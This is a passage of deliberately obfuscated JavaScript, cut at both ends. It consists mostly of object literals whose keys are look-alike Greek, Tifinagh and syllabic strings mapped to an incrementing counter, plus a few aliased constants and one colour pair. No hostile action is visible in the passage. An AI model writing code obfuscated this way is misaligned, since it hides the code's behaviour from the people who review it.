			"ⵠᐃΔΔΔᐃⲆ": ᐃⲆ++,
			"ⵠΔᐃⵠᐃΔⵠ": ᐃⲆ++,
			"ΔΔΔᐃⲆᐃⲆ": ᐃⲆ++,
			"ⲆⵠⵠⲆᐃⲆΔ": ᐃⲆ++,
			"ⲆⲆᐃΔⵠᐃⵠ": ᐃⲆ++,
			"ᐃⲆΔⵠⵠΔⵠ": ᐃⲆ++,
			"ΔⲆⲆⲆⵠⵠΔ": ᐃⲆ++,
			"ᐃᐃΔⲆΔᐃΔ": ᐃⲆ++,
			"ⵠᐃⵠⲆᐃⵠΔ": ᐃⲆ++,
			"ⵠⲆᐃΔΔΔᐃ": ᐃⲆ++,
			"ⲆᐃⲆᐃⲆⲆⵠ": ᐃⲆ++,
			"ⲆⲆΔⵠⵠΔⵠ": ᐃⲆ++,
			"ⵠΔΔⵠᐃⲆᐃ": ᐃⲆ++,
			"ᐃΔΔⵠᐃᐃⲆ": ᐃⲆ++,
			"ⲆΔⲆᐃᐃⲆᐃ": ᐃⲆ++,
			"ΔⲆⲆΔΔᐃⲆ": ᐃⲆ++,
			"ΔΔᐃⵠⲆᐃⵠ": ᐃⲆ++,
			"ⲆΔᐃΔ": ᐃⲆ++,
			"ⵠΔᐃⵠ": ᐃⲆ++,
			"ⵠⵠⲆⵠⵠΔᐃ": ᐃⲆ++,
			"ⵠᐃΔⵠⲆⵠⵠ": ᐃⲆ++,
			"ΔᐃᐃⲆΔΔΔ": ᐃⲆ++,
			"ⵠⲆⲆᐃᐃⲆΔ": ᐃⲆ++,
			"ⲆⲆᐃⵠΔⵠᐃ": ᐃⲆ++,
			"ⲆΔⲆⵠᐃⲆⲆ": ᐃⲆ++,
			"ᐃⵠⲆⵠⵠᐃⵠ": ᐃⲆ++,
			"ΔⵠΔⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔΔⵠᐃΔ": ᐃⲆ++,
			"ᐃⲆⲆⵠΔ": ᐃⲆ++,
			"ΔⵠⲆⲆᐃⲆⲆ": ᐃⲆ++,
			"ᐃⵠⲆⵠⲆ": ᐃⲆ++,
			"ΔΔᐃⲆⲆΔⵠ": ᐃⲆ++,
			"ⲆᐃⲆⵠΔ": ᐃⲆ++,
			"ΔⲆΔᐃⵠᐃΔ": ᐃⲆ++,
			"ⵠᐃⲆΔᐃ": ᐃⲆ++,
			"ⵠᐃᐃⵠⵠ": ᐃⲆ++,
			"ΔⲆΔⵠⵠⵠⲆ": ᐃⲆ++,
			"ⲆᐃΔΔⲆⵠⲆ": ᐃⲆ++,
			"ᐃⵠΔⵠⲆΔⲆ": ᐃⲆ++,
			"ⲆΔᐃⲆΔⵠᐃ": ᐃⲆ++,
			"ⵠᐃⲆΔΔⲆⵠ": ᐃⲆ++,
			"ⵠⲆⵠΔⲆⲆΔ": ᐃⲆ++,
			"ᐃⵠⲆᐃⲆΔΔ": ᐃⲆ++,
			"ᐃⲆΔΔΔΔⵠ": ᐃⲆ++,
			"ᐃᐃⵠⲆⵠᐃᐃ": ᐃⲆ++,
			"ⲆᐃⲆⲆⵠ": ᐃⲆ++,
			"ΔΔΔᐃΔⵠⲆ": ᐃⲆ++,
			"ᐃⵠᐃᐃΔ": ᐃⲆ++,
			"ᐃΔⵠⵠᐃⵠΔ": ᐃⲆ++,
			"ΔⲆΔⲆⵠᐃⵠ": ᐃⲆ++,
			"ⵠⲆⲆⵠᐃⲆᐃ": ᐃⲆ++,
			"ⲆᐃΔⲆⲆⵠΔ": ᐃⲆ++,
			"ⵠⲆⵠⲆⵠⲆⵠ": ᐃⲆ++,
			"ⲆΔⵠᐃΔᐃⲆ": ᐃⲆ++,
			"ᐃᐃᐃⵠⵠⵠᐃᐃⲆ": ᐃⲆ++,
			"ᐃΔᐃⲆⵠⲆⲆ": ᐃⲆ++,
			"ⵠⲆΔΔⵠᐃⵠ": ᐃⲆ++,
			"ᐃⲆⵠⲆΔⲆⲆⵠⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃΔⵠᐃ": ᐃⲆ++,
			"ΔⲆΔᐃΔⲆⲆ": ᐃⲆ++,
			"ⲆᐃᐃΔⵠΔⵠ": ᐃⲆ++,
			"ᐃⲆᐃⵠΔᐃⲆ": ᐃⲆ++,
			"ⵠⲆᐃⲆᐃ": ᐃⲆ++,
			"ᐃⲆⵠⵠⲆⲆᐃ": ᐃⲆ++,
			"ΔⵠⵠⲆⵠᐃⲆ": ᐃⲆ++,
			"ΔΔⵠⲆᐃΔⵠ": ᐃⲆ++,
			"ⲆᐃΔⵠᐃΔⲆ": ᐃⲆ++,
			"ΔΔΔⵠⲆᐃᐃ": ᐃⲆ++,
			"ᐃᐃΔΔⵠᐃᐃ": ᐃⲆ++,
			"ⲆᐃᐃⵠΔᐃⵠ": ᐃⲆ++,
			"ⲆᐃⲆⲆⲆᐃΔ": ᐃⲆ++,
			"ΔⲆⲆⵠᐃⵠᐃ": ᐃⲆ++,
			"ᐃⵠⲆᐃⲆΔⲆ": ᐃⲆ++,
			"ᐃΔᐃᐃᐃᐃᐃ": ᐃⲆ++,
			"ⲆΔᐃⵠⵠⲆΔ": ᐃⲆ++,
			"ⲆⲆΔⲆᐃΔΔ": ᐃⲆ++,
			"ΔΔΔᐃᐃⵠⲆ": ᐃⲆ++,
			"ΔⵠⵠΔⲆ": ᐃⲆ++,
			"ⵠΔⲆᐃⵠⵠΔ": ᐃⲆ++,
			"ᐃᐃⲆᐃΔΔΔ": ᐃⲆ++,
			"ΔᐃⲆⲆᐃΔⲆ": ᐃⲆ++,
			"ᐃΔⲆⲆⲆᐃⵠ": ᐃⲆ++,
			"ΔᐃΔΔⵠΔⵠ": ᐃⲆ++,
			"ΔⵠⵠⵠᐃᐃΔ": ᐃⲆ++,
			"ⲆⲆΔᐃⲆⵠⵠ": ᐃⲆ++,
			"ⵠⵠΔⵠΔΔᐃ": ᐃⲆ++,
			"ⵠᐃⲆΔΔΔⵠ": ᐃⲆ++,
			"ⵠⲆᐃⵠⵠΔᐃ": ᐃⲆ++,
			"ⵠⵠⵠᐃᐃΔⵠ": ᐃⲆ++,
			"ⵠⲆⲆᐃΔᐃⲆ": ᐃⲆ++,
			"ΔⲆΔΔⵠⲆⵠ": ᐃⲆ++,
			"ᐃⵠⵠᐃⵠᐃΔ": ᐃⲆ++,
			"ΔΔΔⲆⲆ": ᐃⲆ++,
			"ΔⲆΔᐃⲆⲆⵠ": ᐃⲆ++,
			"ⵠΔᐃⵠᐃⲆᐃ": ᐃⲆ++,
			"ⲆⵠΔΔⵠⲆⲆ": ᐃⲆ++,
			"ᐃⵠⵠΔⵠⲆⲆ": ᐃⲆ++,
			"ΔΔⲆⵠᐃᐃᐃ": ᐃⲆ++,
			"ⵠⵠⲆⲆⵠⲆⲆ": ᐃⲆ++,
			"ᐃⲆⲆⲆⲆΔⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃΔᐃᐃ": ᐃⲆ++,
			"ΔᐃΔᐃΔⵠᐃ": ᐃⲆ++,
			"ⵠᐃᐃΔⲆⵠΔ": ᐃⲆ++,
			"ᐃᐃⲆⲆⲆⲆᐃ": ᐃⲆ++,
			"ΔⵠᐃΔᐃΔⲆ": ᐃⲆ++,
			"ⲆΔΔΔᐃᐃᐃ": ᐃⲆ++,
			"ΔΔᐃⵠΔⲆΔ": ᐃⲆ++,
			"ⵠΔⲆΔⲆⲆⲆ": ᐃⲆ++,
			"ΔⵠΔⵠᐃⲆⲆ": ᐃⲆ++,
			"ΔⲆⵠⵠΔⲆᐃ": ᐃⲆ++,
			"ᐃⲆⵠⵠⲆΔΔ": ᐃⲆ++,
			"ΔΔⲆᐃᐃⲆᐃ": ᐃⲆ++,
			"ΔΔⲆΔⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆⲆⵠⲆ": ᐃⲆ++,
			"ΔⲆᐃⵠᐃⲆΔ": ᐃⲆ++,
			"ΔᐃⲆΔⲆΔΔ": ᐃⲆ++,
			"ᐃⲆⲆⵠᐃᐃΔ": ᐃⲆ++,
			"ⲆᐃⲆΔᐃΔᐃ": ᐃⲆ++,
			"ᐃⲆⵠⲆΔⲆᐃ": ᐃⲆ++,
			"ⲆⵠΔⵠΔᐃΔ": ᐃⲆ++,
			"ΔᐃⲆΔᐃΔΔ": ᐃⲆ++,
			"ⲆᐃⵠΔⵠᐃⵠ": ᐃⲆ++,
			"ΔΔΔΔⵠᐃᐃ": ᐃⲆ++,
			"ᐃⵠΔᐃᐃⲆΔ": ᐃⲆ++,
			"ΔⵠⲆΔΔⵠᐃ": ᐃⲆ++,
			"ᐃⲆᐃᐃⵠᐃⵠ": ᐃⲆ++,
			"ⲆⵠΔⵠᐃⵠⲆ": ᐃⲆ++,
			"ⵠⵠΔⵠᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆⲆᐃⲆⲆᐃ": ᐃⲆ++,
			"ᐃⵠⲆⵠΔᐃⲆ": ᐃⲆ++,
			"ᐃⲆΔⵠᐃΔⲆ": ᐃⲆ++,
			"ΔΔⲆᐃⲆⵠⵠ": ᐃⲆ++,
			"ΔᐃΔⵠⵠΔⲆ": ᐃⲆ++,
			"ΔᐃⵠᐃⲆⲆⲆ": ᐃⲆ++,
			"ⵠⵠΔⲆΔⲆΔ": ᐃⲆ++,
			"ᐃΔⵠⵠⵠΔΔ": ᐃⲆ++,
			"ⵠΔΔⵠⵠᐃⵠ": ᐃⲆ++,
			"ᐃΔⲆΔⲆΔⵠ": ᐃⲆ++,
			"ⵠΔⵠΔᐃᐃⵠ": ᐃⲆ++,
			"ⵠΔⵠΔⵠᐃⵠ": ᐃⲆ++,
			"ⲆⵠᐃⵠⲆᐃⵠ": ᐃⲆ++,
			"ᐃᐃΔⲆⵠᐃΔ": ᐃⲆ++,
			"ᐃᐃΔⵠⲆⲆᐃ": ["#E9CF96", "#144940"],
			"ᐃⵠᐃⲆΔⲆⲆ": ᐃⲆ++,
			"ΔⵠⵠΔⲆⲆᐃ": ᐃⲆ++,
			"ⵠᐃᐃⲆᐃΔⲆ": ᐃⲆ++,
			"ᐃΔⵠᐃⲆᐃⵠ": ᐃⲆ++,
			"ᐃΔΔᐃΔⲆⲆ": ᐃⲆ++,
			"ⵠΔᐃⵠΔΔⵠ": ᐃⲆ++,
			"ⲆΔⵠᐃΔⲆᐃ": ᐃⲆ++,
			"ⲆᐃᐃⵠΔ": ᐃⲆ++,
			"ⲆᐃΔᐃⵠΔᐃ": ᐃⲆ++,
			"ΔᐃΔⲆⲆΔⲆ": ᐃⲆ++,
			"ⵠΔⵠΔΔΔΔ": ᐃⲆ++,
			"ΔⲆᐃᐃᐃᐃⵠ": ᐃⲆ++,
			"ᐃⵠᐃΔᐃᐃⵠ": ᐃⲆ++,
			"ΔΔⲆⲆΔΔⵠ": ᐃⲆ++,
			"ⲆΔⲆᐃΔᐃⲆ": ᐃⲆ++,
			"ΔⵠᐃΔᐃⲆⵠ": ᐃⲆ++,
			"ᐃⵠΔⵠⲆΔⵠ": ᐃⲆ++,
			"ᐃΔΔΔⵠⵠⵠ": ᐃⲆ++,
			"ⵠᐃⲆΔΔᐃⵠ": ᐃⲆ++,
			"ΔⲆⲆⵠΔⵠΔ": ᐃⲆ++,
			"ΔΔⲆΔⲆⵠⵠ": ᐃⲆ++,
			"ΔᐃᐃΔΔᐃΔ": ᐃⲆ++,
			"ΔⲆⵠⵠⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆⲆⲆⵠⲆΔ": ᐃⲆ++,
			"ⵠᐃΔⲆⵠⵠᐃ": ᐃⲆ++,
			"ΔᐃᐃΔΔΔⵠ": ᐃⲆ++,
			"ᐃⲆᐃⵠⲆⵠⲆ": ᐃⲆ++,
			"ᐃᐃᐃᐃᐃⵠᐃ": ᐃⲆ++,
			"ᐃΔᐃΔⲆΔΔ": ᐃⲆ++,
			"ⵠᐃᐃⲆⲆⲆᐃ": ᐃⲆ++,
			"ⲆΔⲆᐃⵠⵠⲆ": ᐃⲆ++,
			"ⲆⵠⵠΔᐃᐃᐃ": ᐃⲆ++,
			"ⲆᐃᐃⲆⵠⲆᐃ": ᐃⲆ++,
			"ᐃⲆⵠⵠⵠⵠⵠ": ᐃⲆ++,
			"ΔΔΔΔⵠΔⲆ": ᐃⲆ++,
			"ⲆΔΔⵠⲆⲆᐃ": ᐃⲆ++,
			"ⵠⵠⵠᐃΔⵠⲆ": ᐃⲆ++,
			"ΔᐃⲆΔΔΔΔ": ᐃⲆ++,
			"ⲆΔᐃΔᐃⲆⵠ": ᐃⲆ++,
			"ⵠᐃⲆᐃⵠⲆᐃ": ᐃⲆ++,
			"ⵠⵠΔᐃΔᐃⲆ": ᐃⲆ++,
			"ᐃᐃⲆⲆⵠⲆⲆ": ᐃⲆ++,
			"ⵠⲆⲆΔⲆΔⲆ": ᐃⲆ++,
			"ⵠⲆⵠⲆⵠᐃⲆ": ᐃⲆ++,
			"ⵠⵠᐃⵠⵠⲆᐃ": ᐃⲆ++,
			"ᐃΔᐃᐃᐃᐃⲆ": ᐃⲆ++,
			"ⵠΔᐃⲆⲆΔⲆ": ᐃⲆ++,
			"ⲆᐃⲆΔⲆᐃⵠ": ᐃⲆ++,
			"ⲆᐃΔⲆΔⵠΔ": ᐃⲆ++,
			"ΔⵠⲆⵠⲆⵠᐃ": ᐃⲆ++,
			"ⵠᐃⵠⲆΔⵠⵠ": ᐃⲆ++,
			"ⵠⲆⵠⵠᐃⲆⲆ": ᐃⲆ++,
			"ΔⲆᐃⲆⵠⲆᐃ": ᐃⲆ++,
			"ᐃⵠᐃᐃⲆⲆⵠ": ᐃⲆ++,
			"ⵠᐃⵠᐃⲆᐃⵠ": ᐃⲆ++,
			"ᐃᐃⲆⵠΔⲆᐃ": ᐃⲆ++,
			"ⵠᐃΔΔⲆⵠⲆ": ᐃⲆ++,
			"ΔᐃⵠᐃⲆΔⵠ": ᐃⲆ++,
			"ⵠⵠΔᐃⵠⲆΔ": ᐃⲆ++,
			"ⲆᐃⲆⵠⵠⵠΔ": ᐃⲆ++,
			"ⲆⲆⲆⵠᐃⲆⵠ": ᐃⲆ++,
			"ΔⲆΔⵠⵠΔⵠ": ᐃⲆ++,
			"ⲆⲆⲆⵠΔⵠⲆ": ᐃⲆ++,
			"ᐃⲆᐃⲆΔⲆᐃ": ᐃⲆ++,
			"ⵠⲆⵠᐃᐃᐃΔ": ᐃⲆ++,
			"ⵠᐃᐃⵠⲆΔⲆ": ᐃⲆ++,
			"ΔⲆⲆⲆⲆⵠⵠ": ᐃⲆ++,
			"ᐃⵠΔⲆⲆⲆⵠ": ᐃⲆ++,
			"ⵠᐃΔⵠΔᐃⲆ": ᐃⲆ++,
			"ᐃᐃᐃΔᐃ": ᐃⲆ++,
			"ⲆΔᐃⲆⵠᐃᐃ": ᐃⲆ++,
			"ⲆⵠᐃⵠⲆ": ᐃⲆ++,
			"ⵠΔᐃΔᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆᐃⵠΔⲆΔ": ᐃⲆ++,
			"ᐃΔΔΔΔⵠⵠ": ᐃⲆ++,
			"ⲆⵠⵠⲆⵠΔᐃ": ᐃⲆ++,
			"ⲆΔᐃⲆⲆⵠⵠ": ᐃⲆ++,
			"ᐃⵠΔⲆᐃⵠᐃ": ᐃⲆ++,
			"ΔΔⲆΔΔⵠⲆ": ᐃⲆ++,
			"ⵠⲆⲆΔΔΔᐃ": ᐃⲆ++,
			"ᐃⲆΔΔⵠᐃΔ": ᐃⲆ++,
			"ᐃⵠΔΔᐃⲆᐃ": ᐃⲆ++,
			"ⵠⲆⲆΔⵠⲆⵠ": ᐃⲆ++,
			"ᐃⵠΔⲆⲆⵠⵠ": ᐃⲆ++,
			"ⲆΔΔᐃⵠᐃⵠ": ᐃⲆ++,
			"ᐃⵠΔΔΔⲆΔ": ᐃⲆ++,
			"ΔᐃⵠⵠⲆᐃⵠ": ᐃⲆ++,
			"ᐃⵠᐃⵠⲆⵠΔ": ᐃⲆ++,
			"ᐃⵠΔⵠΔⵠᐃ": ᐃⲆ++,
			"ΔⵠⲆᐃⵠⵠⵠ": ᐃⲆ++,
			"ⲆⲆᐃⲆⲆᐃᐃ": ᐃⲆ++,
			"ⵠⲆⲆᐃΔᐃΔ": ᐃⲆ++,
			"ⵠΔΔⵠⵠⵠⲆ": ᐃⲆ++,
			"ᐃⵠᐃⲆᐃΔᐃ": ᐃⲆ++,
			"ⵠᐃⵠⵠⵠΔΔ": ᐃⲆ++,
			"ΔΔᐃⵠΔⲆⵠ": ᐃⲆ++,
			"ⲆⲆΔⲆᐃΔⵠ": ᐃⲆ++,
			"ⵠⵠⵠΔⲆⲆⲆ": ᐃⲆ++,
			"ⲆΔΔΔⲆᐃᐃ": ᐃⲆ++,
			"ᐃΔⵠⵠⵠⲆⵠ": ᐃⲆ++,
			"ᐃⲆⲆᐃᐃⲆΔ": ᐃⲆ++,
			"ⲆⵠΔⲆⲆⵠΔ": ᐃⲆ++,
			"ΔΔΔᐃⵠᐃⲆ": ᐃⲆ++,
			"ⲆΔⲆⲆⵠᐃⵠ": ᐃⲆ++,
			"ΔⵠⵠⲆⲆⲆⵠ": ᐃⲆ++,
			"ⲆᐃⵠⲆᐃⲆᐃ": ᐃⲆ++,
			"ⵠⵠΔⵠⵠⵠⲆ": ᐃⲆ++,
			"ΔᐃΔΔΔⵠⵠ": ᐃⲆ++,
			"ᐃΔⲆΔᐃⲆᐃ": ᐃⲆ++,
			"ⲆᐃⵠⵠⲆᐃᐃ": ᐃⲆ++,
			"ΔⲆᐃⲆΔᐃᐃ": ᐃⲆ++,
			"Δᐃᐃⵠᐃᐃᐃ": ᐃⲆ++,
			"ᐃⲆᐃⵠᐃᐃⵠ": ᐃⲆ++,
			"ΔᐃⲆᐃⲆΔᐃ": ᐃⲆ++,
			"ΔⵠⲆⲆΔⵠⵠ": ᐃⲆ++,
			"ᐃⵠⵠΔⲆⲆⵠ": ᐃⲆ++,
			"ⵠᐃΔΔΔΔⲆ": ᐃⲆ++,
			"ᐃⵠΔⲆᐃⵠΔ": ᐃⲆ++,
			"ⲆᐃⲆᐃⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⵠᐃⵠⲆᐃ": ᐃⲆ++,
			"ᐃᐃⲆⲆΔΔⵠ": ᐃⲆ++,
			"ⲆΔᐃΔⵠᐃⵠ": ᐃⲆ++,
			"ⲆᐃⲆⲆᐃⵠᐃ": ᐃⲆ++,
			"ΔⲆᐃΔᐃΔᐃ": ᐃⲆ++,
			"ΔΔⵠⲆΔΔΔ": ᐃⲆ++
		};
		var ᐃⲆ = 0;
		var ᐃᐃⲆ = {
			"ⵠⲆΔᐃΔ": ᐃⲆ++,
			"ⲆⵠⵠⵠⲆ": ᐃⲆ++,
			"ⵠΔⵠΔᐃ": ᐃⲆ++,
			"ᐃⲆⲆΔᐃ": ᐃⲆ++,
			"ΔᐃⲆΔⲆ": ᐃⲆ++,
			"ⲆⵠᐃⵠΔ": ᐃⲆ++,
			"ΔΔⲆⵠⲆ": ᐃⲆ++,
			"ⵠⲆⲆΔⲆ": ᐃⲆ++,
			"ⵠⲆⵠΔᐃ": ᐃⲆ++,
			"ⵠⲆᐃΔⲆ": ᐃⲆ++,
			"ΔⵠⲆΔⲆ": ᐃⲆ++,
			"ⲆᐃⵠΔⲆ": ᐃⲆ++,
			"ᐃᐃᐃⲆⵠ": ᐃⲆ++,
			"ⲆⵠⵠⲆⵠ": ᐃⲆ++,
			"ΔΔΔⵠΔ": ᐃⲆ++,
			"ᐃⵠⵠⵠᐃ": ᐃⲆ++,
			"ΔⵠⵠΔᐃ": ᐃⲆ++,
			"ΔΔⲆⵠΔ": ᐃⲆ++,
			"ⵠᐃΔΔᐃ": ᐃⲆ++,
			"ⵠᐃᐃⲆΔ": ᐃⲆ++,
			"ⵠᐃⲆᐃⵠ": ᐃⲆ++,
			"ⵠⲆⲆⵠⵠ": ᐃⲆ++,
			"ᐃΔⲆᐃᐃ": ᐃⲆ++,
			"ⵠΔᐃⵠΔ": ᐃⲆ++,
			"ⵠⵠⲆⵠⲆ": ᐃⲆ++,
			"ⲆⲆⵠΔⲆ": ᐃⲆ++,
			"ΔⵠΔΔⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔⲆ": ᐃⲆ++,
			"ΔᐃΔΔΔ": ᐃⲆ++,
			"ⲆⲆΔᐃΔ": ᐃⲆ++,
			"ΔⵠⲆⲆᐃ": ᐃⲆ++,
			"ⲆⲆⵠᐃⵠ": ᐃⲆ++,
			"ΔⲆⲆΔᐃ": ᐃⲆ++,
			"ᐃᐃΔⲆΔ": ᐃⲆ++,
			"ΔΔⵠᐃᐃ": ᐃⲆ++,
			"ⲆᐃⵠΔᐃ": ᐃⲆ++,
			"ⵠᐃⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⵠᐃⵠ": ᐃⲆ++,
			"ⵠⵠᐃⲆⲆ": ᐃⲆ++,
			"ⲆⵠⵠᐃΔ": ᐃⲆ++,
			"ⵠΔⵠᐃΔ": ᐃⲆ++,
			"ⲆⵠⲆΔⲆ": ᐃⲆ++,
			"ⵠⵠΔⲆⵠ": ᐃⲆ++,
			"ⵠⲆⲆⵠⲆ": ᐃⲆ++,
			"ⵠⵠᐃⵠⲆ": ᐃⲆ++,
			"ΔᐃⲆᐃⵠ": ᐃⲆ++,
			"ⵠΔⲆᐃΔ": ᐃⲆ++,
			"ᐃΔⵠⵠⲆ": ᐃⲆ++,
			"ΔᐃⲆⲆΔ": ᐃⲆ++,
			"ⲆᐃⲆⲆⲆ": ᐃⲆ++,
			"Ⲇⵠᐃᐃⵠ": ᐃⲆ++,
			"ⲆΔⵠΔⲆ": ᐃⲆ++,
			"ΔⵠⲆᐃᐃ": ᐃⲆ++,
			"ⲆΔΔⲆᐃ": ᐃⲆ++,
			"ΔΔⵠⵠᐃ": ᐃⲆ++,
			"ⲆΔΔⵠᐃ": ᐃⲆ++,
			"ΔⵠΔⲆⲆ": ᐃⲆ++,
			"ⲆᐃᐃΔⲆ": ᐃⲆ++,
			"ⲆΔⲆᐃᐃ": ᐃⲆ++,
			"ᐃΔᐃΔⵠ": ᐃⲆ++,
			"ΔᐃΔᐃⵠ": ᐃⲆ++,
			"ⵠᐃᐃⵠᐃ": ᐃⲆ++,
			"ⲆΔⵠΔΔ": ᐃⲆ++,
			"ⵠᐃⵠⵠᐃ": ᐃⲆ++,
			"ⵠⵠⵠᐃⲆ": ᐃⲆ++,
			"ⲆⲆⲆⲆⲆ": ᐃⲆ++,
			"ⵠⲆΔΔⵠ": ᐃⲆ++,
			"ⵠⵠⵠΔⲆ": ᐃⲆ++,
			"ⲆΔᐃΔᐃ": ᐃⲆ++,
			"ⲆΔⲆⵠΔ": ᐃⲆ++,
			"ⲆⲆΔⵠⲆ": ᐃⲆ++,
			"ΔⲆⵠⵠᐃ": ᐃⲆ++,
			"ⵠᐃⲆᐃⲆ": ᐃⲆ++,
			"ᐃᐃΔΔⲆ": ᐃⲆ++,
			"ⲆⲆΔⵠⵠ": ᐃⲆ++,
			"ⲆᐃΔΔⲆ": ᐃⲆ++,
			"ⲆⵠⲆᐃᐃ": ᐃⲆ++,
			"ⵠΔⵠᐃⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔⵠ": ᐃⲆ++,
			"ⵠⵠⵠᐃⵠ": ᐃⲆ++,
			"ΔⵠⲆⵠΔ": ᐃⲆ++,
			"ᐃⵠΔⲆᐃ": ᐃⲆ++,
			"ⵠⲆⵠΔⵠ": ᐃⲆ++,
			"ΔⵠᐃⲆⵠ": ᐃⲆ++,
			"ᐃᐃⲆⵠᐃ": ᐃⲆ++,
			"ⲆⵠΔᐃⲆ": ᐃⲆ++,
			"ΔᐃⲆⵠΔ": ᐃⲆ++,
			"ᐃⵠⵠⲆΔ": ᐃⲆ++,
			"ⵠΔΔᐃⲆ": ᐃⲆ++,
			"ⲆⵠⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⲆⲆⲆ": ᐃⲆ++,
			"ⲆⵠΔⲆΔ": ᐃⲆ++,
			"ⵠⵠⲆⲆᐃ": ᐃⲆ++,
			"ᐃⲆΔΔⵠ": ᐃⲆ++,
			"ΔⵠᐃΔⲆ": ᐃⲆ++,
			"ᐃⵠᐃⲆⲆ": ᐃⲆ++,
			"ᐃᐃΔΔΔ": ᐃⲆ++,
			"ΔⵠⲆΔᐃ": ᐃⲆ++,
			"ⲆⲆΔᐃᐃ": ᐃⲆ++,
			"ⲆⲆⵠᐃᐃ": ᐃⲆ++,
			"ⵠᐃᐃⵠ": ᐃⲆ++,
			"ⵠΔⵠΔⲆ": ᐃⲆ++,
			"ΔΔΔΔᐃ": ᐃⲆ++,
			"ΔΔΔⵠᐃ": ᐃⲆ++,
			"ΔⵠΔⵠΔ": ᐃⲆ++,
			"ⲆΔᐃⲆᐃ": ᐃⲆ++,
			"ΔⲆΔⲆᐃ": ᐃⲆ++,
			"ⵠΔⲆᐃⵠ": ᐃⲆ++,
			"ⲆⵠΔΔⵠ": ᐃⲆ++,
			"ⵠᐃΔⲆⲆ": ᐃⲆ++,
			"ᐃᐃⲆⲆᐃ": ᐃⲆ++,
			"ⵠⲆᐃᐃᐃ": ᐃⲆ++,
			"ᐃⲆΔⲆⵠⲆΔ": ᐃⲆ++,
			"ΔⲆⲆⲆΔⵠᐃ": ᐃⲆ++,
			"ΔΔⲆᐃᐃ": ᐃⲆ++,
			"ⵠⵠᐃⲆⵠ": ᐃⲆ++,
			"ΔᐃΔⲆᐃ": ᐃⲆ++,
			"ᐃⵠᐃⲆⵠ": ᐃⲆ++,
			"ⲆΔΔΔᐃ": ᐃⲆ++,
			"ⵠⵠΔⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔⲆⲆ": ᐃⲆ++,
			"ⵠᐃΔⲆᐃ": ᐃⲆ++,
			"ΔΔᐃⲆΔ": ᐃⲆ++,
			"ΔΔⵠᐃⵠ": ᐃⲆ++,
			"ⲆⵠᐃⲆⵠ": ᐃⲆ++,
			"ΔⵠⲆⵠⵠ": ᐃⲆ++,
			"ⵠᐃⲆⲆⵠ": ᐃⲆ++,
			"ⵠⵠᐃⵠΔ": ᐃⲆ++,
			"ΔⲆⲆⲆⲆ": ᐃⲆ++,
			"ᐃⲆⲆᐃⲆ": ᐃⲆ++,
			"ⵠⲆⵠⲆᐃ": ᐃⲆ++,
			"ⵠᐃΔⲆⵠ": ᐃⲆ++,
			"ΔᐃΔΔᐃ": ᐃⲆ++,
			"ᐃΔⲆᐃΔ": ᐃⲆ++,
			"ⲆΔᐃⲆⵠ": ᐃⲆ++,
			"ᐃⲆⵠⲆⵠ": ᐃⲆ++,
			"ΔⵠⲆⲆⲆ": ᐃⲆ++,
			"ᐃⵠΔⵠΔ": ᐃⲆ++,
			"ⵠᐃᐃΔⵠ": ᐃⲆ++,
			"ⲆⲆᐃᐃΔ": ᐃⲆ++,
			"ᐃⵠⵠΔⲆ": ᐃⲆ++,
			"ⵠΔΔⵠⵠ": ᐃⲆ++,
			"ⲆⵠⲆΔᐃ": ᐃⲆ++,
			"ᐃᐃΔⵠᐃ": ᐃⲆ++,
			"ᐃⵠⲆⵠⵠ": ᐃⲆ++,
			"ⵠⲆⲆⲆΔ": ᐃⲆ++,
			"ΔᐃⵠΔⲆ": ᐃⲆ++,
			"ⲆΔⲆⵠⵠ": ᐃⲆ++,
			"ⲆᐃⵠᐃⲆ": ᐃⲆ++,
			"ⲆⵠⵠΔᐃ": ᐃⲆ++,
			"ᐃᐃᐃⵠΔ": ᐃⲆ++,
			"Ⲇⵠᐃⵠⵠ": ᐃⲆ++,
			"ᐃΔⵠⲆⲆ": ᐃⲆ++,
			"ΔᐃᐃΔΔ": ᐃⲆ++,
			"ⲆⵠᐃΔΔ": ᐃⲆ++,
			"ⲆⲆΔⲆᐃ": ᐃⲆ++,
			"ΔᐃᐃΔᐃ": ᐃⲆ++,
			"ᐃΔⲆᐃⲆ": ᐃⲆ++,
			"ΔⵠⵠⵠΔ": ᐃⲆ++,
			"Δⵠⵠⵠⵠ": ᐃⲆ++,
			"ΔⲆᐃΔⵠ": ᐃⲆ++,
			"ᐃⵠᐃⲆᐃ": ᐃⲆ++,
			"ⲆⲆⲆⲆΔ": ᐃⲆ++,
			"ⵠΔΔⲆⵠ": ᐃⲆ++,
			"ᐃᐃΔΔⵠ": ᐃⲆ++,
			"ⲆⵠΔⲆⲆ": ᐃⲆ++,
			"ΔᐃⲆΔᐃ": ᐃⲆ++,
			"ⲆᐃⵠⵠΔ": ᐃⲆ++,
			"ⲆΔΔⵠⵠ": ᐃⲆ++,
			"ⵠΔⲆΔΔ": ᐃⲆ++,
			"ⵠⲆᐃⵠᐃ": ᐃⲆ++,
			"ΔΔⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆᐃⵠⲆ": ᐃⲆ++,
			"ⲆᐃⲆΔⵠ": ᐃⲆ++,
			"ⵠΔⲆⵠΔ": ᐃⲆ++,
			"ΔⵠᐃⵠⲆ": ᐃⲆ++,
			"ⲆᐃᐃⵠⲆ": ᐃⲆ++
		};
		const ⲆᐃᐃΔⵠⵠᐃ = ΔΔⲆᐃⵠ;
		const ⵠᐃⲆᐃᐃⵠᐃ = ᐃᐃⲆⵠⲆ;
		const ⲆⲆⵠᐃⲆⵠⲆ = ⲆᐃΔⵠΔ;
		const ⵠⲆⵠⵠ = ⵠⵠΔΔ;
		var ᐃⲆ = ⵠⲆⲆ;
		const ΔΔᐃⲆⲆ = ⵠΔᐃⵠⵠ;
		var ᐃᐃ = {
			"ⲆᐃⵠΔᐃ": ᐃⲆ++,
			"ⲆⵠᐃⵠΔ": ᐃⲆ++,
			"ⲆᐃⵠⲆᐃ": ᐃⲆ++,
